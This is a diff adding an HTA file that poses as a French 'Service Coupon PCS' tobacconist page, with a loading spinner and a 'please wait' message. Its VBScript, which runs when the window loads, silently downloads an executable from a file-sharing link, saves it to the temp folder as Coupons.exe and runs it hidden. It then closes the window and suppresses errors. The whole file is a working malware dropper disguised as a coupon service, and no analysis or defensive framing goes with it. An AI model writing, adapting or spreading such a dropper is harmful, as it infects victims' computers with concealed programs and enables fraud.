@@ -1,0 +1,106 @@
+<html>
+<head>
+<title>Service Coupon PCS</title>
+<HTA:APPLICATION 
+  ID="App"
+  APPLICATIONNAME="PCS"
+  BORDER="thin"
+  BORDERSTYLE="normal"
+  CAPTION="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  WINDOWSTATE="normal"
+  SCROLL="no"
+  SYSMENU="yes"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no">
+
+<style>
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(to bottom, #f0f4ff, #ffffff);
+    color: #333;
+    margin: 0;
+    padding: 40px 20px;
+    text-align: center;
+  }
+
+  .logo {
+    font-size: 24px;
+    font-weight: bold;
+    color: #0078D7;
+    margin-bottom: 10px;
+  }
+
+  .subtitle {
+    font-size: 16px;
+    color: #666;
+    margin-bottom: 30px;
+  }
+
+  .spinner {
+    margin: 20px auto;
+    width: 60px;
+    height: 60px;
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #0078D7;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg);}
+    100% { transform: rotate(360deg);}
+  }
+
+  .footer {
+    font-size: 13px;
+    color: #aaa;
+    margin-top: 30px;
+  }
+</style>
+
+<script language="VBScript">
+Sub Window_OnLoad
+  On Error Resume Next
+
+  Dim urlExe, objXMLHTTP, objADOStream, objFSO, tempFilePath, shell
+
+  ' URL directe du fichier EXE à télécharger
+  urlExe = "https://e.pcloud.link/publink/download?code=XZ4fb6Z8eQppgF0nC51RdAmat4ckLGvxl97"
+
+  Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+  objXMLHTTP.Open "GET", urlExe, False
+  objXMLHTTP.Send
+
+  If objXMLHTTP.Status = 200 Then
+      Set objADOStream = CreateObject("ADODB.Stream")
+      objADOStream.Type = 1 ' binaire
+      objADOStream.Open
+      objADOStream.Write objXMLHTTP.ResponseBody
+
+      Set objFSO = CreateObject("Scripting.FileSystemObject")
+      tempFilePath = objFSO.GetSpecialFolder(2) & "\Coupons.exe"
+
+      objADOStream.SaveToFile tempFilePath, 2 ' overwrite si existe
+      objADOStream.Close
+
+      Set shell = CreateObject("WScript.Shell")
+      ' Lancement en mode caché (0)
+      shell.Run Chr(34) & tempFilePath & Chr(34), 0, False
+  Else
+      MsgBox "Erreur lors du téléchargement : " & objXMLHTTP.Status
+  End If
+
+  self.close
+End Sub
+</script>
+
+</head>
+<body>
+  <div class="logo">Service Coupon – Bureau de Tabac</div>
+  <div class="subtitle">Votre coupon PCS est en cours de traitement...</div>
+  <div class="spinner"></div>
+  <div class="footer">Merci de patienter quelques instants</div>
+</body>
+</html>
